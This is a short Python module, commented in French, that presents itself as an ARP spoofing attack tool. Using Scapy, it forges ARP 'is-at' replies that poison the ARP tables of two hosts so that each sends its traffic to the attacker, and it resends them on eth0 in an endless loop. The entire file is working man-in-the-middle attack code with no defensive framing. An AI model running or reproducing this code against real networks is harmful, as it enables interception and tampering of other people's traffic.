"""Module d'attaque ARP Spoofing visant IP_A et IP_B"""
#!/usr/bin/env python3
from scapy.all import ARP, Ether, sendp
from time import sleep

def arp(ipa="10.27.0.1", ipb="10.27.0.2", delay=5):
    """Génère et envoie la réponse ARP "is-at" """
    # Crée une réponse ARP pour empoisonner la table ARP de ipa
    arp_response_a = ARP(pdst=ipa, psrc=ipb, op="is-at")
    # Crée une réponse ARP pour empoisonner la table ARP de ipb
    arp_response_b = ARP(pdst=ipb, psrc=ipa, op="is-at")
    # Crée un en-tête Ethernet
    ether = Ether()

    while True:
        # Envoie la réponse ARP empoisonnée pour ipa
        sendp(ether / arp_response_a, iface="eth0")
        # Envoie la réponse ARP empoisonnée pour ipb
        sendp(ether / arp_response_b, iface="eth0")
        # Attend pendant le délai spécifié avant de renvoyer les paquets
        sleep(delay)


